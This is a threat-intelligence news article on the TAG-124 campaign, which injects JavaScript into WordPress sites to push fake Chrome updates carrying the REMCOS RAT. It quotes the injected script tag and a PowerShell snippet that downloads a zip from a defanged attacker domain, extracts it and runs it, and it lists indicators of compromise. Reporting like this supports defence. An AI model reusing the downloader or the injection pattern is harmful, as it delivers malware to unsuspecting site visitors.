---
title: "TAG-124 Hacked 1000+ WordPress Sites To Embed Payloads"
date: 2025-02-01
---

A sophisticated cyber campaign orchestrated by the threat group TAG-124 has compromised over 1,000 WordPress websites to deploy malicious payloads.

The operation leverages a multi-layered Traffic Distribution System (TDS) to infect users with malware, demonstrating advanced evasion tactics and infrastructure management.

TAG-124’s infrastructure consists of compromised WordPress sites injected with malicious JavaScript to redirect visitors to attacker-controlled payload servers.

<figure>

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnDd8-Ea0EnyKbDJOKHT0OenwaH6bXqRVvd7AR2FnxoP_Lt0K-lV2yzTuEhL_0FBPhuhK2vzdC_9brJfvBcPymBGDRokaxIJPbhsdft8fGhC-bbhvagwXQbUVLOIqkAS8Y1fsHq9JnUhcQazOpYgHChqXkPsR93Pw2Tdojrthw2aVNfJjysHwTrMG-0EI/s16000/TAG-124's%20high-level%20infrastructure%20setup%20(Source%20-%20Recorded%20Future).webp)

<figcaption>

TAG-124’s high-level infrastructure setup (Source – Recorded Future)

</figcaption>

</figure>

These servers host malware disguised as legitimate software updates, such as fake Google Chrome updates.

<figure>

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYPGxVf7ieY_adZzwKP-LvbN0NfAyzHGtB1VM7aPaewwbVDW6UmQDEOc6Cq0N7te3fpr6xuK3cqc19w7TrAChunBE4qTH4xW6AM8PDx-tn0RlslsQLcSnb2iez_VHKmje2mmDpLPALBpnwk7TaY2VCUN9Z0FJslDRYVdgnYis3zxCGakMSgUL_V1wqmwo/s16000/Fake%20Google%20Chrome%20update%20variant%201%20(left)%20and%202%20(right)%20(Source%20-%20Recorded%20Future).webp)

<figcaption>

Fake Google Chrome update variant 1 (left) and 2 (right) (Source – Recorded Future)

</figcaption>

</figure>

A central management panel allows attackers to control and update URLs, logic, and infection tactics, enabling dynamic and adaptive attack strategies.

<figure>

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilBsT726m6dmQroMgA6sG-PB3dY6TAQ3W8s2C2__gGuq2FGXjo6Nc5YAlmXOK5maKMWcLkU81n536p7BLeBpEDPW2NZLSpvQX5YnZzbZqVh0sR5frJZvbdwgdAYkWnS40pEbt02vW9dbjP_EaYstVAf3BcqgfjA6DU-Ueq1Zuz9PC8D6zAuNM9QfejFSI/s16000/Google%20Chrome%20fake%20update%20landing%20page%20on%20update-chronne%5B.%5Dcom%20(Source%20-%20Recorded%20Future).webp)

<figcaption>

Google Chrome fake update landing page on update-chronne\[.\]com (Source – Recorded Future)

</figcaption>

</figure>

Researchers at Insikt Group, Recorded Future’s threat research division noted that the attack begins when users visit compromised WordPress sites embedded with malicious scripts like the following:-

```
<script async="" src="https://vicrin[.]com/metrics.js"></script>
```

This script dynamically loads additional resources from attacker-controlled domains. TAG-124 frequently changes file names (e.g., `metrics.js`, `hpms1989.js`) and URLs to evade detection.

## **Payload Delivery**

Visitors meeting specific conditions (geolocation or browser type) are redirected to fake landing pages mimicking legitimate software updates. For instance:-

```
<a href="https://update-chronne[.]com/Release.zip">Update Chrome</a>
```

The downloaded file, `Release.zip`, contains malware such as the REMCOS Remote Access Trojan (RAT). A PowerShell script hosted on the same domain automates the malware installation:

```
$webClient = New-Object System.Net.WebClient
$url1 = "https://update-chronne[.]com/Release.zip"
$zipPath1 = "$env:TEMPmgz.zip"
$webClient.DownloadFile($url1, $zipPath1)
Expand-Archive -Path $zipPath1 -DestinationPath "$env:TEMPfile"
Start-Process -FilePath "$env:TEMPfileSet-upx.exe"
```

TAG-124 employs advanced techniques such as:-

1. **ClickFix Technique**: Displays dialogs prompting users to execute pre-copied commands.

4. **Dynamic URL Updates**: Regularly changes URLs and filenames on compromised sites.

7. **Conditional Logic in TDS**: Filters traffic based on visitor attributes to optimize infections.

The campaign has been linked to multiple ransomware groups, including Rhysida and Interlock, which utilize TAG-124’s infrastructure for their initial infection chains. The shared use of this TDS highlights collaboration among cybercriminal groups.

To protect against similar attacks, keep WordPress core, plugins, and themes updated to patch known vulnerabilities, and regularly scan for unauthorized JavaScript injections.

Implementing Web Application Firewalls (WAFs) helps block malicious traffic targeting vulnerable endpoints, while educating users about the risks of downloading software updates from unverified sources enhances overall security.

## **Indicators of Compromise (IoCs)**

Key domains and IPs used in the attack include:-

- Domains: `vicrin[.]com`, `update-chronne[.]com`

- IPs: `146.70.41[.]191`, `45.61.136[.]67`

Compromised WordPress sites include high-profile domains such as: `www[.]ecowas[.]int` and `www[.]reloadinternet[.]com`.

**`Collect Threat Intelligence with TI Lookup to Improve Your Company’s Security - Get 50 Free Request`**

The post TAG-124 Hacked 1000+ WordPress Sites To Embed Payloads appeared first on Cyber Security News.

Go to Source
